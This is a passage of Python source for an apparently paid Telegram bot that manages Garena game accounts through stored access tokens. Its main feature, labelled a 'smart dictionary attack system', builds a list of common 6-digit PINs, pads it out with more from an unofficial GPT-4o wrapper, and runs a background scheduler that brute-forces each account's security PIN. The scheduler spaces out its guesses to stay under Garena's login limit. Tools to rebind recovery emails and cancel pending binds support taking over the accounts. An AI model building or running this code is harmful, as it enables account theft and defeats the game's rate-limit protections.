        u_info = DataManager.get_users().get(str(user_id), {})
        accounts = u_info.get("accounts", {})
        if not accounts:
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home")]])
            await smart_edit(query, get_txt("no_saved_accs", lang), keyboard)
            return
        
        loading_lbl = "⏳ جاري فحص الحسابات..." if lang == LANG_AR else "⏳ Checking Garena sessions..."
        await smart_edit(query, loading_lbl, InlineKeyboardMarkup([]))
        
        tasks = [garena.get_player_info(acc["ACCESS_TOKEN"]) for acc in accounts.values()]
        results = await asyncio.gather(*tasks)
        
        buttons = []
        for (aid, acc), (_, _, _, active) in zip(accounts.items(), results):
            status_emoji = "🟢 شغال" if active else "🔴 محروق"
            buttons.append([InlineKeyboardButton(f"👤 {acc['NAME']} ({status_emoji})", callback_data=f"view_acc_{acc['ID']}")])
            
        buttons.append([InlineKeyboardButton("↩️ العودة للقائمة الرئيسية" if lang == LANG_AR else "↩️ Back to Menu", callback_data="btn_goto_home")])
        keyboard = InlineKeyboardMarkup(buttons)
        await smart_edit(query, get_txt("my_saved_accs_title", lang), keyboard)
        return

    if data == "btn_ctrl_accs":
        u_info = DataManager.get_users().get(str(user_id), {})
        accounts = u_info.get("accounts", {})
        if not accounts:
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home")]])
            await smart_edit(query, get_txt("no_saved_accs", lang), keyboard)
            return
            
        buttons = [[InlineKeyboardButton(f"⚙️ {acc['NAME']}", callback_data=f"ctrl_acc_{aid}")] for aid, acc in accounts.items()]
        buttons.append([InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home")])
        await smart_edit(query, get_txt("choose_ctrl_acc", lang), InlineKeyboardMarkup(buttons))
        return

    if data.startswith("ctrl_acc_") or data.startswith("view_acc_"):
        aid = data.split("_")[2]
        context.user_data["ctrl_account_id"] = aid
        await show_account_control_view(query, user_id, aid, context)
        return

    if data == "op_check_email":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        email, pending, countdown, _ = await garena.get_bind_info(acc["ACCESS_TOKEN"])
        
        lbl_current = get_txt("current_email", lang)
        lbl_pending = get_txt("pending_email", lang)
        lbl_remaining = get_txt("remaining_time", lang)
        header_lbl = "معلومات تأمين حساب:" if lang == LANG_AR else "Account Security Details for:"
        
        msg = (
            f"🔍 <b>{header_lbl} {acc['NAME']}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"{lbl_current} <code>{email or 'None'}</code>\n"
            f"{lbl_pending} <code>{pending or 'None'}</code>\n"
            f"{lbl_remaining} <b>{convert_seconds(countdown, lang) if pending else 'None'}</b>"
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع لوحة التحكم" if lang == LANG_AR else "↩️ Back", callback_data=f"ctrl_acc_{aid}")]])
        await smart_edit(query, msg, keyboard)
        return

    if data == "op_add_email":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        context.user_data["state"] = "awaiting_bind_email_input"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data=f"ctrl_acc_{aid}")]])
        await smart_edit(query, get_txt("enter_new_email", lang), keyboard)
        return

    if data == "op_cancel_pending":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        success, msg = await garena.cancel_bind_request(acc["ACCESS_TOKEN"])
        
        msg_resp = garena.format_api_text(msg, "طلب إلغاء الربط المعلق", "Cancel Pending Bind Request", lang)
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع لوحة التحكم" if lang == LANG_AR else "↩️ Back", callback_data=f"ctrl_acc_{aid}")]])
        await smart_edit(query, msg_resp, keyboard)
        return

    if data == "op_set_bio":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        context.user_data["state"] = "awaiting_long_bio_text"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data=f"ctrl_acc_{aid}")]])
        await smart_edit(query, get_txt("enter_long_bio", lang), keyboard)
        return

    if data == "op_revoke_token":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        error, rdata = await garena.do_revoke(acc["ACCESS_TOKEN"])
        if error:
            err_lbl = "❌ فشل تسجيل الخروج:" if lang == LANG_AR else "❌ Failed to revoke token:"
            await smart_edit(query, f"{err_lbl} {error}", InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data=f"ctrl_acc_{aid}")]]))
            return
        
        DataManager.delete_garena_account(user_id, aid)
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع للقائمة الرئيسية" if lang == LANG_AR else "↩️ Back to Menu", callback_data="btn_goto_home")]])
        success_lbl = "🔴 <b>تم إلغاء صلاحية التوكن وتسجيل الخروج بنجاح!</b> تم إزالة الحساب المحروق من لوحة تحكمك." if lang == LANG_AR else "🔴 <b>Token successfully revoked and logged out!</b> Account has been deleted."
        await smart_edit(query, success_lbl, keyboard)
        return

    if data.startswith("op_delete_acc_"):
        aid = data.split("_")[3]
        DataManager.delete_garena_account(user_id, aid)
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع للقائمة الرئيسية" if lang == LANG_AR else "↩️ Back to Menu", callback_data="btn_goto_home")]])
        await smart_edit(query, get_txt("deleted_success", lang), keyboard)
        return

    if data == "btn_admin_panel" and is_admin:
        await smart_edit(query, get_txt("admin_welcome", lang), make_admin_menu(lang, user_id == OWNER_ID))
        return

    if data == "adm_goto_user" and is_admin:
        await smart_edit(query, get_txt("welcome_back", lang), make_user_menu(lang, is_admin))
        return

    if data == "adm_set_channel" and is_admin:
        # عرض القناة الحالية إن وجدت
        channel_config = get_channel_config()
        current_channel = channel_config.get("channel_username", "")
        
        if current_channel:
            msg = get_txt("current_channel_info", lang).format(channel=current_channel) + "\n\n" + get_txt("set_channel_prompt", lang)
        else:
            msg = get_txt("set_channel_prompt", lang)
            
        context.user_data["state"] = "adm_awaiting_channel_username"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel")]])
        await smart_edit(query, msg, keyboard)
        return

    if data == "adm_edit_texts" and is_admin:
        if lang == LANG_AR:
            buttons = [
                [InlineKeyboardButton("📝 رسالة الترحيب (مسجل)", callback_data="edit_txt_welcome_back")],
                [InlineKeyboardButton("💰 رسالة البوت مدفوع", callback_data="edit_txt_welcome_unregistered")],
                [InlineKeyboardButton("🔘 زر إضافة حساب", callback_data="edit_btn_add_acc")],
                [InlineKeyboardButton("🔘 زر قائمة حساباتي", callback_data="edit_btn_my_accs")],
                [InlineKeyboardButton("🔘 زر التحكم في الحسابات", callback_data="edit_btn_ctrl_accs")],
                [InlineKeyboardButton("🔘 زر تواصل", callback_data="edit_btn_contact")],
                [InlineKeyboardButton("🔘 زر المساعدة", callback_data="edit_btn_help")],
                [InlineKeyboardButton("🔄 إعادة تعيين الكل للافتراضي", callback_data="edit_txt_reset")],
                [InlineKeyboardButton("↩️ رجوع", callback_data="btn_admin_panel")],
            ]
            title = "✏️ <b>تعديل رسائل وأزرار البوت</b>\n\nاختر ما تريد تعديله:"
        else:
            buttons = [
                [InlineKeyboardButton("📝 Welcome Message (registered)", callback_data="edit_txt_welcome_back")],
                [InlineKeyboardButton("💰 Paid Bot Message", callback_data="edit_txt_welcome_unregistered")],
                [InlineKeyboardButton("🔘 Add Account Button", callback_data="edit_btn_add_acc")],
                [InlineKeyboardButton("🔘 My Accounts Button", callback_data="edit_btn_my_accs")],
                [InlineKeyboardButton("🔘 Control Accounts Button", callback_data="edit_btn_ctrl_accs")],
                [InlineKeyboardButton("🔘 Contact Button", callback_data="edit_btn_contact")],
                [InlineKeyboardButton("🔘 Help Button", callback_data="edit_btn_help")],
                [InlineKeyboardButton("🔄 Reset All to Default", callback_data="edit_txt_reset")],
                [InlineKeyboardButton("↩️ Back", callback_data="btn_admin_panel")],
            ]
            title = "✏️ <b>Edit Bot Messages & Buttons</b>\n\nSelect what to edit:"
        await smart_edit(query, title, InlineKeyboardMarkup(buttons))
        return

    if data.startswith("edit_txt_") or data.startswith("edit_btn_"):
        if not is_admin:
            return
        if data == "edit_txt_reset":
            save_custom_texts({})
            await query.answer("✅ تم إعادة التعيين للافتراضي" if lang == LANG_AR else "✅ Reset to defaults", show_alert=True)
            await smart_edit(query, get_txt("admin_welcome", lang), make_admin_menu(lang, user_id == OWNER_ID))
            return

        key = data.replace("edit_txt_", "").replace("edit_btn_", "btn_")
        context.user_data["state"] = "adm_awaiting_custom_text"
        context.user_data["edit_text_key"] = key
        context.user_data["edit_text_lang"] = lang

        current = get_custom_text(key, lang) or get_txt(key, lang) if not key.startswith("btn_") else get_button_label(key.replace("btn_", ""), lang)
        prompt = (
            f"✏️ <b>تعديل النص</b>\n\n"
            f"المفتاح: <code>{key}</code>\n\n"
            f"النص الحالي:\n<code>{current[:500] if current else 'الافتراضي'}</code>\n\n"
            f"أرسل النص الجديد الآن (يدعم HTML مثل &lt;b&gt; و &lt;code&gt;):"
            if lang == LANG_AR else
            f"✏️ <b>Edit Text</b>\n\n"
            f"Key: <code>{key}</code>\n\n"
            f"Current:\n<code>{current[:500] if current else 'default'}</code>\n\n"
            f"Send the new text now (HTML supported):"
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="adm_edit_texts")]])
        await smart_edit(query, prompt, keyboard)
        return

    if data == "adm_gen_key" and is_admin:
        context.user_data["state"] = "adm_awaiting_key_duration"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel")]])
        prompt_lbl = "⏱️ <b>توليد مفتاح تفعيل جديد:</b>\n\nأرسل المدة المطلوبة الآن (مثال: <code>24 hours</code> أو <code>30 days</code>):" if lang == LANG_AR else "⏱️ <b>Generate new activation key:</b>\n\nSend desired duration (e.g. <code>24 hours</code> or <code>30 days</code>):"
        await smart_edit(query, prompt_lbl, keyboard)
        return

    if data == "adm_gen_batch" and is_admin:
        context.user_data["state"] = "adm_awaiting_batch_count"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel")]])
        prompt = "📦 <b>توليد دفعة مفاتيح:</b>\n\nأدخل عدد المفاتيح التي ترغب في توليدها (مثال: 10):" if lang == LANG_AR else "📦 <b>Batch Keys Generation:</b>\n\nEnter the number of keys to generate (e.g. 10):"
        await smart_edit(query, prompt, keyboard)
        return

    if data == "adm_disable_key" and is_admin:
        context.user_data["state"] = "adm_awaiting_disable_key_code"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel")]])
        prompt = "🔴 <b>إيقاف وتعطيل مفتاح:</b>\n\nأرسل كود مفتاح التفعيل الذي ترغب في تعطيله فوراً من قاعدة البيانات:" if lang == LANG_AR else "🔴 <b>Disable Activation Key:</b>\n\nSend the activation key code you want to deactivate immediately:"
        await smart_edit(query, prompt, keyboard)
        return

    if data == "adm_list_keys" and is_admin:
        keys = KeyManager.get_all()
        if not keys:
            msg = "📭 <b>لا توجد أي مفاتيح نشطة حالياً في قاعدة البيانات!</b>" if lang == LANG_AR else "📭 <b>No active keys found in the database!</b>"
        else:
            msg = "📋 <b>قائمة المفاتيح المفعّلة والنشطة بالسيستم:</b>\n" if lang == LANG_AR else "📋 <b>Active Database Keys List:</b>\n"
            msg += "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            for k, v in list(keys.items())[:20]:
                status = "🟢" if v.get("active", True) else "🔴"
                users_count = len(v.get("users", []))
                max_dev = v.get("max_devices", 5)
                expires_at = v.get("expires_at", "")
                try:
                    dt = datetime.fromisoformat(expires_at)
                    remaining = dt - datetime.now()
                    if remaining.total_seconds() > 0:
                        days = remaining.days
                        hours, remainder = divmod(remaining.seconds, 3600)
                        minutes, _ = divmod(remainder, 60)
                        time_str = f"{days} يوم و {hours} ساعة و {minutes} دقيقة" if lang == LANG_AR else f"{days}d {hours}h {minutes}m"
                    else:
                        time_str = "منتهي 🔴" if lang == LANG_AR else "Expired 🔴"
                except:
                    time_str = "غير معروف" if lang == LANG_AR else "Unknown"
                msg += f"• {status} <code>{k}</code>\n  👥 الأجهزة: ({users_count}/{max_dev}) | ⏱️ المتبقي: <b>{time_str}</b>\n\n"
        
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع لوحة التحكم" if lang == LANG_AR else "↩️ Back", callback_data="btn_admin_panel")]])
        await smart_edit(query, msg, keyboard)
        return

    if data == "adm_kick_user" and is_admin:
        context.user_data["state"] = "adm_awaiting_kick_id"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel")]])
        prompt_lbl = "👤 <b>طرد مستخدم عبر المعرّف:</b>\n\nأرسل الآيدي الرقمي لعضو تليجرام لإلغاء جميع مفاتيح تفعيله وفصله فوراً:" if lang == LANG_AR else "👤 <b>Kick user out via ID:</b>\n\nSend Telegram User ID to detach and cancel their subscription:"
        await smart_edit(query, prompt_lbl, keyboard)
        return

    if data == "adm_add_admin" and user_id == OWNER_ID:
        context.user_data["state"] = "adm_awaiting_admin_id"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel")]])
        prompt_lbl = "➕ <b>إضافة أدمن ومسؤول جديد للبوت:</b>\n\nأرسل الآيدي الرقمي الخاص بالعضو لتضمينه كمسؤول له صلاحيات متوسطة:" if lang == LANG_AR else "➕ <b>Add new admin via ID:</b>\n\nSend Telegram User ID to promote them as a moderator:"
        await smart_edit(query, prompt_lbl, keyboard)
        return

    if data == "adm_broadcast" and is_admin:
        context.user_data["state"] = "adm_awaiting_broadcast_text"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel")]])
        prompt_lbl = "📢 <b>بث جماعي للأعضاء:</b>\n\nأرسل نص الرسالة التي ترغب في إرسالها لكل مشتركي البوت الآن:" if lang == LANG_AR else "📢 <b>Broadcast globally:</b>\n\nSend the message you want to broadcast to all members:"
        await smart_edit(query, prompt_lbl, keyboard)
        return

    if data == "adm_json_log" and is_admin:
        if user_id != OWNER_ID:
            alert_msg = "❌ عذراً، هذا الإجراء الحساس متاح فقط لمالك البوت الرئيسي!" if lang == LANG_AR else "❌ Sorry, this critical action is restricted to the main Owner only!"
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
            return

        log_json = DataManager.generate_json_log()
        bio = BytesIO(log_json.encode('utf-8'))
        bio.name = "users_log.json"
        caption_lbl = "📋 <b>تم إنتاج وتصدير ملف سجل المستخدمين والحسابات بنجاح!</b>" if lang == LANG_AR else "📋 <b>Users database exported successfully!</b>"
        await context.bot.send_document(
            chat_id=user_id,
            document=bio,
            caption=caption_lbl,
            parse_mode="HTML"
        )
        return

    if data == "adm_stats" and is_admin:
        keys_db = DataManager.get_keys()
        users_db = DataManager.get_users()
        active_keys = sum(1 for k in keys_db.values() if k.get("active", True))
        total_accounts = sum(len(u.get("accounts", {})) for u in users_db.values())
        
        msg = get_txt("stats_title", lang).format(
            keys_total=len(keys_db),
            keys_active=active_keys,
            users_total=len(users_db),
            accounts_total=total_accounts
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_admin_panel")]])
        await smart_edit(query, msg, keyboard)
        return

# ============================================================
# INSTANT SMART GUESSING RUNNER
# ============================================================
async def run_guessing_for_account(bot, uid: str, aid: str) -> None:
    users = DataManager.get_users()
    uinfo = users.get(str(uid))
    if not uinfo:
        return
    acc = uinfo.get("accounts", {}).get(aid)
    if not acc or not acc.get("guessing_active", False):
        return

    today_str = datetime.now().strftime("%Y-%m-%d")

    eat_token = acc.get("EAT") or acc.get("ACCESS_TOKEN")
    err_token, token_data = await garena.eat_to_token(eat_token)
    if not err_token and token_data.get("access_token"):
        acc["ACCESS_TOKEN"] = token_data["access_token"]
        DataManager.save_users(users)

    # استخدام البريد الذي أدخله المستخدم بدلاً من get_bind_info
    email = acc.get("recovery_email")
    if not email:
        acc["guessing_active"] = False
        DataManager.save_users(users)
        try:
            await bot.send_message(
                chat_id=int(uid),
                text=f"⚠️ تم إيقاف التخمين الذكي على حساب <b>{acc['NAME']}</b> لعدم وجود بريد إلكتروني محفوظ. أعد تشغيل التخمين وأدخل البريد.",
                parse_mode="HTML"
            )
        except:
            pass
        return

    acc_date = acc.get("last_guess_date", "")
    if acc_date != today_str:
        acc["last_guess_date"] = today_str
        acc["guesses_today_count"] = 0
        DataManager.save_users(users)

    today_guesses = acc.get("guesses_today_count", 0)
    if today_guesses >= 10:
        return

    max_to_try = 10 - today_guesses

    for _ in range(max_to_try):
        users = DataManager.get_users()
        acc = users.get(str(uid), {}).get("accounts", {}).get(aid)
        if not acc or not acc.get("guessing_active", False):
            break

        # تحديث البريد من البيانات المحفوظة في كل دورة
        email = acc.get("recovery_email")
        if not email:
            break

        pin_idx = acc.get("pin_index", 0)
        pin = get_pin_by_index(pin_idx)

        success, text_res, identity_token = await garena.verify_identity_sec(email, acc["ACCESS_TOKEN"], pin)

        if "error_login_limit" in text_res or "limit" in text_res.lower():
            acc["guesses_today_count"] = 10
            acc["last_guess_date"] = today_str
            DataManager.save_users(users)
            try:
                await bot.send_message(
                    chat_id=int(uid),
                    text=f"⚠️ <b>نظام الطوارئ (تفادي البان) الفعّال:</b>\n\nاكتشف البوت أن خادم جارينا أرجع خطأ <code>error_login_limit</code> لحسابك <b>{acc['NAME']}</b>.\nتم تجميد التخمين تلقائياً لمدة 24 ساعة لحماية التوكن من الاحتراق والبان.",
                    parse_mode="HTML"
                )
            except:
                pass
            break

        acc["pin_index"] = pin_idx + 1
        acc["guesses_today_count"] = acc.get("guesses_today_count", 0) + 1
        acc["last_guess_date"] = today_str
        DataManager.save_users(users)

        if success and identity_token:
            acc["guessing_active"] = False
            DataManager.save_users(users)
            msg = (
                f"🎉 <b>خبر مفرح لقد تم ايجاد رمز حساب</b>\n\n"
                f"👤 اسم الحساب: <b>{acc['NAME']}</b>\n"
                f"🔑 الرمز: <code>{pin}</code>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            )
            try:
                await bot.send_message(chat_id=int(uid), text=msg, parse_mode="HTML")
            except:
                pass
            break

        await asyncio.sleep(10)

# ============================================================
# SMART DICTIONARY ATTACK SYSTEM
# ============================================================
def generate_smart_dictionary() -> list:
    easy_universal = [
        "123456", "654321", "000000", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888", "999999",
        "123123", "321321", "112233", "332211", "121212", "101010", "123321", "321123", "987654", "456789", "135790", "246800"
    ]
    
    patterns = [
        "111222", "222111", "000111", "111000", "123450", "010203", "102030", "147258", "369258", "258369", 
        "951753", "159357", "753951", "123457", "111122", "222211", "000011", "121234", "123412"
    ]
    
    birth_standalone = []
    for y in range(1985, 2016):
        ys = str(y)
        birth_standalone.append(f"00{ys}")
        birth_standalone.append(f"{ys}00")
        birth_standalone.append(f"01{ys}")
        birth_standalone.append(f"12{ys}")
        birth_standalone.append(f"20{ys}")
        birth_standalone.append(f"19{ys}")

    date_month = []
    for y in range(1990, 2012):
        ys = str(y)[2:]
        for m in range(1, 13):
            for d in [1, 5, 10, 15, 20, 25]:
                date_month.append(f"{d:02d}{m:02d}{ys}")
                date_month.append(f"{m:02d}{d:02d}{ys}")

    combined = easy_universal + patterns + birth_standalone + date_month
    seen = set()
    final_list = [x for x in combined if not (x in seen or seen.add(x)) if len(x) == 6 and x.isdigit()]
    return final_list

def get_pin_by_index(index: int) -> str:
    if index < len(SMART_DICTIONARY):
        return SMART_DICTIONARY[index]
    return f"{index:06d}"[:6]

async def enrich_dictionary_with_g4f(existing_list: list) -> list:
    try:
        import g4f
        prompt = "Give me 50 of the most common 6-digit numeric codes/pins used by people. Output only as a JSON array of strings: [\"123456\", ...]"
        
        response = await asyncio.wait_for(
            asyncio.to_thread(
                g4f.ChatCompletion.create,
                model=g4f.models.gpt_4o,
                messages=[{"role": "user", "content": prompt}]
            ),
            timeout=10.0
        )
        match = re.search(r'\[.*\]', response, re.DOTALL)
        if match:
            ai_pins = json.loads(match.group(0))
            for pin in ai_pins:
                pin = str(pin).strip()
                if len(pin) == 6 and pin.isdigit() and pin not in existing_list:
                    existing_list.append(pin)
    except Exception as e:
        print(f"G4F Dictionary Enrichment skipped/failed or timed out: {e}")
    return existing_list

SMART_DICTIONARY = generate_smart_dictionary()

# ============================================================
# BACKGROUND CRON-LIKE SCHEDULER
# ============================================================
async def background_guessing_task(bot) -> None:
    print("🧠 Smart Guessing Scheduler is running...")
    while True:
        try:
            users = DataManager.get_users()
            today_str = datetime.now().strftime("%Y-%m-%d")
            
            for uid, uinfo in list(users.items()):
                accounts = uinfo.get("accounts", {})
                for aid, acc in list(accounts.items()):
                    if acc.get("guessing_active", False):
                        guesses_today = acc.get("guesses_today_count", 0)
                        acc_date = acc.get("last_guess_date", "")
                        
                        if acc_date != today_str or guesses_today < 10:
                            asyncio.create_task(run_guessing_for_account(bot, uid, aid))
        except Exception as e:
            print(f"⚠️ Error in background guessing task: {e}")
            
        await asyncio.sleep(600)

async def post_init(application: Application) -> None:
    global SMART_DICTIONARY
    SMART_DICTIONARY = await enrich_dictionary_with_g4f(SMART_DICTIONARY)
    asyncio.create_task(background_guessing_task(application.bot))

# ============================================================
# APPLICATION RUNNER
# ============================================================
def run_telegram_bot():
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("loginstatus", cmd_login_status))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_inputs))
    application.add_handler(CallbackQueryHandler(handle_callback_queries))
    
    print(f"⚡ iyad Bot Running ({DEV_NAME}) is starting...")
    application.run_polling()

if __name__ == "__main__":
    run_telegram_bot()